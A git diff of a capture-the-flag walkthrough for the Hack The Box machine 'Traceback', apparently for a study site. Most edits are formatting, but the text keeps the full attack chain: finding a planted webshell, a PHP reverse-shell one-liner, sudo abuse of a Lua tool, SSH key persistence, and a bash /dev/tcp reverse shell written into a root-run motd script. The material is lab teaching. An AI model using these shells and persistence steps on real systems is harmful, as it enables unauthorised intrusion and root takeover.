@@ -2,7 +2,7 @@
 
 ## Enumeration
 
-We start off with a full-port nmap to check running services \(most of output truncated\)
+We start off with a full-port nmap to check running services (most of output truncated)
 
 ```bash
 $ sudo nmap -sS -n -p- -A -oN full.nmp 10.10.10.181
@@ -24,15 +24,15 @@ We see port 22 with SSH and port 80 with HTTP. Let's check the HTTP.
 
 We're greeted with a strange message:
 
-![The Message](../../.gitbook/assets/image%20%282%29.png)
+![The Message](<../../.gitbook/assets/image (45).png>)
 
 It seems as if our job is to find the "backdoor" into the system. The source has nothing particularly interesting, except for a comment:
 
-![The Comment](../../.gitbook/assets/image%20%2811%29.png)
+![The Comment](<../../.gitbook/assets/image (37).png>)
 
 If we google this comment we come across an interesting [GitHub repo](https://github.com/TheBinitGhimire/Web-Shells) with a collection of reverse shells. Let's put their names in a file called `wordlist.txt` and run `gobuster`:
 
-```text
+```
 alfa3.php
 alfav3.0.1.php
 andela.php
@@ -51,7 +51,7 @@ smevk.php
 wso2.8.5.php
 ```
 
-```text
+```
 $ gobuster dir -u http://10.10.10.181/ -w wordlist.txt -t 50
 
 ===============================================================
@@ -61,11 +61,11 @@ $ gobuster dir -u http://10.10.10.181/ -w wordlist.txt -t 50
 
 It appears as if `smevk.php` is on the target! Let's head over to http://10.10.10.181/smevk.php and we what happens.
 
-![The Webshell](../../.gitbook/assets/image%20%287%29.png)
+![The Webshell](<../../.gitbook/assets/image (4).png>)
 
 It definitely exists! The [repo ](https://github.com/TheBinitGhimire/Web-Shells/blob/master/smevk.php)tells us the default credentials are `admin:admin`.
 
-![Yes, it&apos;s pretty hideous](../../.gitbook/assets/image%20%289%29.png)
+![Yes, it's pretty hideous](<../../.gitbook/assets/image (7).png>)
 
 ## Foothold
 
@@ -73,13 +73,13 @@ The webshell looks horrible, but we have an `Execute` input where we can run com
 
 First we use `nc` on a terminal to listen for incoming connections:
 
-```text
+```
 $ nc -nvlp 9001
 ```
 
 Next we use a [PHP reverse shel](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)l **on the webshell** to redirect execution to it:
 
-```text
+```
 $ php -r '$sock=fsockopen("10.10.14.21",9001);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
@@ -91,7 +91,7 @@ We get a connection! This is a fairly bad shell, but we can easily [upgrade it t
 
 Now we have a foothold, let's check what's in our user's home directory. It appears to be a file called `note.txt`:
 
-```text
+```
 webadmin@traceback:/home/webadmin$ ls
 note.txt
 
@@ -104,7 +104,7 @@ Contact me if you have any question.
 
 We have been left "a tool to practise Lua". As always, first thing we should do as a new user is **check our permissions.**
 
-```text
+```
 webadmin@traceback:/home/webadmin$ sudo -l
 User webadmin may run the following commands on traceback:
     (sysadmin) NOPASSWD: /home/sysadmin/luvit
@@ -120,13 +120,13 @@ os.execute("/bin/bash")
 
 This is the command we want to run. We can simply use `echo` to create it:
 
-```text
+```
 webadmin@traceback:/home/webadmin$ echo 'os.execute("/bin/bash")' > privesc.lua
 ```
 
 Now let's run it as `sysadmin`!
 
-```text
+```
 $ sudo -u sysadmin /home/sysadmin/luvit privesc.lua
 $ whoami
 sysadmin
@@ -140,7 +140,7 @@ You could also have done it in one line using the `-e` flag:
 
 We can now read `user.txt`!
 
-```text
+```
 sysadmin@traceback:/home/webadmin$ cat ~/user.txt
 895...
 ```
@@ -153,7 +153,7 @@ Firstly, we want to get a nice SSH shell. We can get this using SSH keys.
 
 First create the key pair:
 
-```text
+```
 $ ssh-keygen -f traceback
 
 Generating public/private rsa key pair.
@@ -172,7 +172,7 @@ When using `echo` in these scenarios, use `>>` rather than `>`. Using only a sin
 If `~/.ssh` doesn't exist already, make sure you create it.
 {% endhint %}
 
-```text
+```
 echo "<public key>" >> ~/.ssh/authorized_keys
 ```
 
@@ -182,7 +182,7 @@ Make sure you spell it `authorized` not `authorised`!
 
 Now we can log in via SSH using
 
-```text
+```
 ssh -i traceback sysadmin@10.10.10.181
 ```
 
@@ -190,13 +190,13 @@ ssh -i traceback sysadmin@10.10.10.181
 
 To perform some automated privesc recon, I'm going to run [`linpeas`](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).  Port it over by hosting it on a python SimpleHTPServer:
 
-```text
+```
 $ sudo python3 -m http.server 80
 ```
 
 The `wget` it on the box:
 
-```text
+```
 wget 10.10.14.21/linpeas.sh
 ```
 
@@ -204,9 +204,9 @@ Then `chmod`, run and analyse the output.
 
 Something that **really** sticks out is this:
 
-![GROUP Writeable Files](../../.gitbook/assets/image%20%285%29.png)
+![GROUP Writeable Files](<../../.gitbook/assets/image (44).png>)
 
-These scripts get run **every time someone logs in with SSH**. If we can modify them \(which we can\), they will run whatever we modify them to. The important part here is [**they get run as root**](http://manpages.ubuntu.com/manpages/xenial/man5/update-motd.5.html#:~:text=Ubuntu%20introduced%20the%20update%2Dmotd,%2Fvar%2Frun%2Fmotd.).
+These scripts get run **every time someone logs in with SSH**. If we can modify them (which we can), they will run whatever we modify them to. The important part here is [**they get run as root**](http://manpages.ubuntu.com/manpages/xenial/man5/update-motd.5.html).
 
 ### Exploitation
 
@@ -223,17 +223,17 @@ echo -e '#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.21/9002 0>&1' > 00-header
 
 Make sure you set up an `nc` listener on port 9002 and then log in via SSH again.
 
-```text
+```
 $ nc -nvlp 9002
 ```
 
-```text
+```
 $ ssh -i traceback sysadmin@10.10.10.181
 ```
 
 And bam, we have a root shell.
 
-```text
+```
 root@traceback:/# whoami
 whoami
 root
@@ -242,6 +242,4 @@ root@traceback:/# cat /root/root.txt
 cat /root/root.txt
 e68...
 ```
-
-
 
